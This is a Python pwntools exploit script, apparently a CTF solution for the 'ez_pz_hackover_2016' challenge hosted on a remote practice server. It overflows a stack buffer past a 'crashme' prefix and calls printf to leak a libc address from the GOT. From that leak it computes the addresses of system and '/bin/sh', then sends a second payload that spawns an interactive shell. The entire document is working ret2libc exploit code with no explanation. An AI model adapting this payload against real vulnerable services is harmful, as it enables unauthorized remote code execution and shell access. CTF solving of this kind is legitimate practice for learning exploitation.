from pwn import *
context.log_level = 'debug'
#p = process("./ez_pz_hackover_2016")
p = remote("pwn.buuoj.cn", 20040)
elf = ELF("./ez_pz_hackover_2016")
libc = ELF("x86_libc.so.6")
#libc = ELF("libc-2.23.so")
if args.G:
	gdb.attach(p)
chall = 0x8048603

p.recvuntil("> ")
payload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(elf.plt['printf']) + p32(chall) +  p32(elf.got['printf'])
p.sendline(payload)
p.recvline_startswith('Welcome')
printf_addr = u32(p.recv(4))
log.success("printf_addr ==> " + hex(printf_addr))
libc_base = printf_addr - libc.sym['printf']
log.success("libc_base ==> " + hex(libc_base))
system_addr = libc.sym['system'] + libc_base
binsh_addr = libc.search("/bin/sh").next() + libc_base

payload = 'crashme\x00' + 'a' * (0x32-8-0x14-4) + p32(system_addr) + p32(0) +  p32(binsh_addr)
p.sendline(payload)
p.interactive() 
